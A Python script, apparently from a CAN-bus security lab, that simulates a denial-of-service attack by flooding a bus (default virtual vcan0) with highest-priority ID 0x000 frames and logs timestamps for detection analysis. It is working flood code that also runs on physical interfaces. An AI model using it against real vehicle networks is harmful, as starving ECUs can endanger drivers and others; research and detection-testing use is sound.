#!/usr/bin/env python3
"""
DoS (bus flooding / arbitration starvation) simulation.

CAN arbitration is priority-based: during a collision, the frame with the
numerically LOWEST ID wins and is transmitted; competing higher-ID frames
back off and retry. This script floods the bus with a very low, fixed ID
as fast as possible, simulating an attacker starving out every other
(legitimate, higher-ID) ECU on the bus without needing to know anything
about their message formats.

Writes precise start/end unix timestamps to a marker file so analysis
scripts can align "before/during/after" windows to ground truth instead
of estimating from wall-clock observation.
"""
import argparse
import json
import time

import can


def flood(bus, target_id, duration, burst_size):
    print(f"[dos] flooding id=0x{target_id:03X} for {duration}s "
          f"(burst_size={burst_size} frames per send loop)")
    data = bytes([0xFF] * 8)
    sent = 0
    t0_unix = time.time()
    start = time.monotonic()
    end = start + duration
    while time.monotonic() < end:
        for _ in range(burst_size):
            msg = can.Message(arbitration_id=target_id, data=data, is_extended_id=False)
            bus.send(msg)
            sent += 1
    t1_unix = time.time()
    elapsed = time.monotonic() - start
    print(f"[dos] done. Sent {sent} frames in {elapsed:.2f}s "
          f"(~{sent / elapsed:.0f} frames/sec)")
    return t0_unix, t1_unix, sent


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--channel", default="vcan0")
    ap.add_argument("--id", type=lambda x: int(x, 0), default=0x000,
                     help="flood ID — lower wins arbitration (default 0x000, highest priority)")
    ap.add_argument("--duration", type=float, default=10.0)
    ap.add_argument("--burst-size", type=int, default=1,
                     help="frames sent per inner loop iteration before yielding; "
                          "raise this on fast hosts if flood isn't saturating the bus")
    ap.add_argument("--marker-file", default="logs/dos_marker.json",
                     help="where to write the flood's precise start/end unix timestamps")
    args = ap.parse_args()

    print(f"[plan] flood id=0x{args.id:03X}  duration={args.duration}s\n")

    bus = can.Bus(interface="socketcan", channel=args.channel)
    try:
        t0, t1, sent = flood(bus, args.id, args.duration, args.burst_size)
    finally:
        bus.shutdown()

    with open(args.marker_file, "w") as f:
        json.dump({"flood_start_unix": t0, "flood_end_unix": t1,
                    "target_id": args.id, "frames_sent": sent}, f, indent=2)
    print(f"[dos] wrote marker file: {args.marker_file}")


if __name__ == "__main__":
    main()
